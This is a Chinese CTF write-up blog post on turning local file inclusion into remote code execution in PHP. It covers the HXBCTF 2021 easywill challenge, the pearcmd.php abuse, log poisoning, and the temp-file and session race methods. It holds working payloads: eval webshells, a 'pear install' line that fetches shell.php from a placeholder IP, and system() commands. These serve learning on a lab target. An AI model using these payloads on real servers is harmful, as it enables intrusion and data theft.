@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="IcMl0x824">
+    <meta name="author" content="IcMl0x824">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/03/14/pearcmd/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="从[HXBCTF 2021]湖湘杯easywill-1看如何利用pearcmd.php从LFI到Getshell再到LFI文件不落地RCE的学习">
+    <meta property="og:description" content="IcMl0x824">
+    <meta property="og:url" content="http://example.com2023/03/14/pearcmd/">
+    
+    <meta property="og:site_name" content="IcMl0x824 &#39;s Blog">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="从[HXBCTF 2021]湖湘杯easywill-1看如何利用pearcmd.php从LFI到Getshell再到LFI文件不落地RCE的学习">
+    <meta name="twitter:description" content="IcMl0x824">
+    <meta name="twitter:image" content="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    <meta name="theme-color" content="#0066cc">
+    <link rel="shortcut icon" href="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+    
+    <title>
+        
+            从[HXBCTF 2021]湖湘杯easywill-1看如何利用pearcmd.php从LFI到Getshell再到LFI文件不落地RCE的学习 -
+        
+        IcMl0x824 &#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    
+    
+    
+    <script id="hexo-configurations">
+    let REDEFINE = window.REDEFINE || {};
+    REDEFINE.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","avatar":"https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png","favicon":"https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":55},"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_image":{"light":"https://pic.imgdb.cn/item/64107b55ebf10e5d5386aa1a.jpg","dark":"https://pic.imgdb.cn/item/64107b89ebf10e5d5387068c.jpg"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"font_sizes":{"title":"2.8rem","subtitle":"1.5rem"},"line_height":1.2,"title":"春江潮水连海平 海上明月共潮生","subtitle":{"enable":true,"list":["滟滟随波千万里","何处春江无月明"]},"custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.1","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":false,"audio":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}}};
+    REDEFINE.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+    
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="menu-wrapper">
+    
+    <div class="menu-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                IcMl0x824 &#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="menu-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="menu-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-menu-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+                      
+                <div class="article-title">
+                    <img src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212212254216.png" alt="从[HXBCTF 2021]湖湘杯easywill-1看如何利用pearcmd.php从LFI到Getshell再到LFI文件不落地RCE的学习" />
+                    <h1 class="article-title-cover">从[HXBCTF 2021]湖湘杯easywill-1看如何利用pearcmd.php从LFI到Getshell再到LFI文件不落地RCE的学习</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202303141839090.png">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">IcMl0x824</span>
+                            
+                                <span class="author-label">Lv2</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="pc">2023-03-14 23:29:25</span>
+        <span class="mobile">2023-03-14 23:29</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="pc">2023-03-14 23:30:17</span>
+            <span class="mobile">2023-03-14 23:30</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <blockquote>
+<p>前言：</p>
+<p>哈哈实在是太菜了，今天正好闲着就来学习学习LFI的一种思路，之前我记得强网杯，羊城杯都出现关于pearcmd.php的文件包含，不打CTF的我，只是道听途说，菜狗一个。正好被<strong>烨师傅</strong>点了一手，就来看看关于pearcmd.php直接getshell，LFI裸文件包含，以及LFI文件不落地RCE。做一次复现与学习。</p>
+</blockquote>
+<h3 id="HXBCTF-2021-湖湘杯easywill-1"><a href="#HXBCTF-2021-湖湘杯easywill-1" class="headerlink" title="[HXBCTF 2021]湖湘杯easywill-1"></a>[HXBCTF 2021]湖湘杯easywill-1</h3><h4 id="框架审计寻包含"><a href="#框架审计寻包含" class="headerlink" title="框架审计寻包含"></a>框架审计寻包含</h4><p>经过搜索哈，找到了一个能够复现学习这个点的一道题目，在BUUCTF上（2021湖湘杯CTF）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212212254216.png"
+                      alt="image-20221221225409105"
+                ></p>
+<p>咳咳，事先没看过WP，心口雌黄的写，至于哪里可能有错，多多包涵哈师傅们。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212212255026.png"
+                      alt="image-20221221225537956"
+                ></p>
+<p>打开一看是一个willPHP开发的框架，值得一提的是，他给出了开发手册和下载的地址，对我来说基本CTF基础为0，但起码得把这个框架下载下来搭建在本地，然后代审，这是一个该有的素养emmm。所以完成这两点：</p>
+<ol>
+<li>本地搭建环境进行测试</li>
+<li>读一读开发手册或者找找相关的漏洞</li>
+</ol>
+<p>nm的通过特殊的渠道找到了2.1.5的源码，在PHPstudy中搭建环境</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220001499.png"
+                      alt="image-20221222000138423"
+                ></p>
+<p>为了和靶场环境做到一模一样，emmm</p>
+<p>给了一小段源码</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">home</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span><span class="title function_ invoke__"> function index</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="title function_ invoke__">assign</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span><span class="title function_ invoke__"> view</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>接着我们将源码粘贴到app目录下controller的IndexController.php文件中</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220010045.png"
+                      alt="image-20221222001028966" style="zoom:67%;" 
+                >
+
+<p>这会我们本地的环境就和题目一模一样了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220011021.png"
+                      alt="image-20221222001116960"
+                ></p>
+<p>先从我第一眼看到的assign函数入手</p>
+<p>先看的肯定是helper.php</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220023579.png"
+                      alt="image-20221222002311505"
+                ></p>
+<p>记住这个view，再继续跟进到willphp\wiphp\View.php这个文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220024380.png"
+                      alt="image-20221222002402308"
+                ></p>
+<p>我们这时候返回到helper.php中再看一眼view函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220026339.png"
+                      alt="image-20221222002626264"
+                ></p>
+<p>再看看View.php，有点麻，还好看到了render方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220030773.png"
+                      alt="image-20221222003056704"
+                ></p>
+<p>在Tple.php看最后处理$vfile的Tple类中的render方法</p>
+<p>看到这里发现有extract和include，可以利用extact存在变量覆盖以及文件包含</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220037799.png"
+                      alt="image-20221222003755730"
+                ></p>
+<p>所以说$_vars数组的值是我们index.php中传入的</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_vars[name]=value</span><br></pre></td></tr></table></figure></div>
+
+<p>我们只需要让name为cfile，extact变量覆盖掉下面include的$cfile，即可进行任意文件包含不是吗？</p>
+<p>所以第一个payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?name=cfile&amp;value=/etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220043480.png"
+                      alt="image-20221222004342400"
+                ></p>
+<p>我们拿到BUUCTF的靶机中发现确实成功了。</p>
+<p>接下来我们是要拿靶机的flag的，光读一个passwd，问题是我们要写个shell进去啊</p>
+<p>哈哈，通过读这篇文章：《利用pearcmd.php从LFI到getshell》</p>
+<p>链接：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/121042290" >https://blog.csdn.net/rfrder/article/details/121042290 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>再安利一下P神关于Docker PHP裸文件本地包含的综述，妈的写的太好了。</p>
+<p>链接：<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html" >https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>我们可以利用pearcmd.php写入shell到&#x2F;tmp目录下</p>
+<h4 id="pear是个啥？"><a href="#pear是个啥？" class="headerlink" title="pear是个啥？"></a>pear是个啥？</h4><p>Pear的全称叫PHP Extension and Application Repository，也就是PHP扩展与应用仓库。pearcmd.php实际上是pecl&#x2F;pear中的文件，值得注意的是，pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl&#x2F;pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定<code>--with-pear</code>才会安装。不过，在Docker任意版本镜像中，pcel&#x2F;pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code>。原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。</p>
+<h4 id="打开你的register-argc-argv"><a href="#打开你的register-argc-argv" class="headerlink" title="打开你的register_argc_argv"></a>打开你的register_argc_argv</h4><p>Docker环境下的PHP会开启<code>register_argc_argv</code>这个配置。如果存在php.ini的话，默认是Off。如果没有php.ini则默认是On。而PHP官方提供的镜像里面也是默认没有php.ini，所以也是默认开启了这个register_argc_argv的。</p>
+<p>开启了这个东西有什么用呢？开启的时候<code>$_SERVER[‘argv’]</code>就会生效，而用户的输入将会被赋予给<code>$argc</code>、<code>$argv</code>、<code>$_SERVER[&#39;argv&#39;]</code>几个变量。</p>
+<h4 id="看看pear"><a href="#看看pear" class="headerlink" title="看看pear?"></a>看看pear?</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat /usr/local/etc# cat /usr/bin/pear</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># first find which PHP binary to use</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;x<span class="variable">$PHP_PEAR_PHP_BIN</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  PHP=<span class="string">&quot;<span class="variable">$PHP_PEAR_PHP_BIN</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;/usr/bin/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_bin<span class="string">&#x27;@&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    PHP=php</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PHP=<span class="string">&quot;/usr/bin/php&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># then look for the right pear include dir</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;x<span class="variable">$PHP_PEAR_INSTALL_DIR</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; <span class="keyword">then</span></span><br><span class="line">  INCDIR=<span class="variable">$PHP_PEAR_INSTALL_DIR</span></span><br><span class="line">  INCARG=<span class="string">&quot;-d include_path=<span class="variable">$PHP_PEAR_INSTALL_DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">test</span> <span class="string">&quot;/usr/share/pear&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_dir<span class="string">&#x27;@&#x27;</span>; <span class="keyword">then</span></span><br><span class="line">    INCDIR=`<span class="built_in">dirname</span> <span class="variable">$0</span>`</span><br><span class="line">    INCARG=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    INCDIR=<span class="string">&quot;/usr/share/pear&quot;</span></span><br><span class="line">    INCARG=<span class="string">&quot;-d include_path=/usr/share/pear&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="variable">$PHP</span> -C -q <span class="variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=<span class="string">&quot;&quot;</span> -d safe_mode=0 -d register_argc_argv=<span class="string">&quot;On&quot;</span> -d auto_prepend_file=<span class="string">&quot;&quot;</span> -d auto_append_file=<span class="string">&quot;&quot;</span> <span class="variable">$INCDIR</span>/pearcmd.php <span class="string">&quot;<span class="variable">$@</span>&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>读的有点懵逼，看了P神和先前的文章才勉强懂</p>
+<p>简单来说就是：最后一行调用了pearcmd.php，而pearcmd.php中<code>$argv</code>就是通过<code>$_SERVER[&#39;argv&#39;]</code>来获取到的。这样的话我们就可以通过包含<code>pearcmd.php</code>，利用<code>$_SERVER[&#39;argv&#39;]</code>来调用pear命令。</p>
+<p>要想调用pear命令，我不懂这个哈哈，感觉和常用的那个composer差不多，都可以下载东西，如果pear命令也可以下载东西并且保存在本地的话，在我们已知道一个文件包含的情况下，下载一个恶意的php文件然后包含它不就可以getshell了？的确可以的，命令如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install -R /tmp http://IP/shell.php</span><br></pre></td></tr></table></figure></div>
+
+<p>这样就可以把<code>shell.php</code>下载到<code>/tmp</code>目录下面，还有不出网的利用姿势：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear -c /tmp/.feng.php -d man_dir=<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span> -s</span><br></pre></td></tr></table></figure></div>
+
+<p>相当于写配置到&#x2F;tmp&#x2F;.feng.php了，内容和文件名都可控，不好的地方可能就是如果没写好的话容易G。这样子：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/.feng.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+</span><br></pre></td></tr></table></figure></div>
+
+<p>如果没有开启短标签的话，还是下载文件比较好用。但是也是很有意思的一种利用方式了。</p>
+<p>看到这应该也懂个七七八八了，我也不再起docker的php去证实了。</p>
+<p>最终的BUUCTF靶场环境，我们构造这样的payload：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220128960.png"
+                      alt="image-20221222012818883" style="zoom: 25%;" 
+                >
+
+<p>咳咳，乱入。</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>])<span class="meta">?&gt;</span>+/tmp/aa.php</span><br></pre></td></tr></table></figure></div>
+
+<p>burp抓包写入：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220118986.png"
+                      alt="image-20221222011834906"
+                ></p>
+<p>接下来试着执行命令：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3a06b9b7-fd74-4295-bfce-e9146d1d5432.node4.buuoj.cn:81/?name=cfile&amp;value=/tmp/aa.php</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()?"></a>phpinfo()?</h4><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220120294.png"
+                      alt="image-20221222012056214"
+                ></p>
+<h4 id="康康根目录"><a href="#康康根目录" class="headerlink" title="康康根目录"></a>康康根目录</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220122900.png"
+                      alt="image-20221222012226818"
+                ></p>
+<p>看到flag了,拿下！</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0=system(&#x27;cat /flag32897328937298hdwidh&#x27;);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220123552.png"
+                      alt="image-20221222012346472"
+                ></p>
+<p>连接蚁剑</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220140596.png"
+                      alt="image-20221222014016534"
+                ></p>
+<p>这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过一个数据包去搞定。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220130979.png"
+                      alt="image-20221222013024949" style="zoom: 67%;" 
+                >
+
+<h3 id="PHP-如何从LFI到RCE？"><a href="#PHP-如何从LFI到RCE？" class="headerlink" title="PHP-如何从LFI到RCE？"></a>PHP-如何从LFI到RCE？</h3><p>内容来自作者：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_50643984" >javelin266桑桑 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>是不是很经典？我们梳理梳理都有哪些手法?</p>
+<h4 id="污染日志文件包含"><a href="#污染日志文件包含" class="headerlink" title="污染日志文件包含"></a>污染日志文件包含</h4><p>在黑盒的情况下，通常最古老的RCE方式是包含日志文件，通过写入一句话，然后包含这个文件去getshell</p>
+<p>例如IIS和apache，apache一般的日志文件只有root组才能访问，www用户是读不了的，那么如果是IIS就可以直接写入一句话</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后通过包含</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/varl/og/apache2/access.log</span><br></pre></td></tr></table></figure></div>
+
+<p>就可以实现getshell</p>
+<h4 id="phpinfo和文件包含条件竞争"><a href="#phpinfo和文件包含条件竞争" class="headerlink" title="phpinfo和文件包含条件竞争"></a>phpinfo和文件包含条件竞争</h4><p>我们对任意一个PHP文件发送一个上传的数据包时，不管这个PHP服务后端是否有处理$_FILES的逻辑，PHP都会将用户上传的数据先保存到一个临时文件中，这个文件一般位于系统临时目录，文件名是php开头，后面跟6个随机字符；在整个PHP文件执行完毕后，这些上传的临时文件就会被清理掉.</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202212220152106.png"
+                      alt="image-20221222015237063" style="zoom:50%;" 
+                >
+
+<p>在从“PHP writes data to temp file”到“php removes temp files(if any)”这两个操作之间的这段时间，我们可以包含这个临时文件，最后完成getshell操作。但这里面暗藏了一个大坑就是，临时文件的文件名我们是不知道的。</p>
+<p>例如：我们上传一个这样的文件，不管他后台有没有这个逻辑，php都会保存在一个临时文件，过了某个时间段就清理，那么我们就只能条件竞争了。那么我们不知道临时文件在哪，还有文件名是啥也不知道，就是形如&#x2F;tmp&#x2F;phpxxx，后面的xxx为随机字母和数字组合的6位数。</p>
+<p>那么我们只要在phpinfo页面有个地方可以看到它的位置，那么就可以写脚本来条件竞争了</p>
+<p>直接贴p牛的EXP：<a class="link"   target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py" >https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="session-upload-progress与Session文件包含"><a href="#session-upload-progress与Session文件包含" class="headerlink" title="session.upload_progress与Session文件包含"></a>session.upload_progress与Session文件包含</h4><p>session方法也已经广为流传，PHP中可以通过session progress功能实现临时文件的写入。这种利用方式需要满足下面几个条件</p>
+<p>1.目标环境开启了session.upload_progress.enable选项<br>2.发送一个文件上传请求，其中包含一个文件表单和一个名字是PHP_SESSION_UPLOAD_PROGRESS的字段<br>3.请求的Cookie中包含Session ID</p>
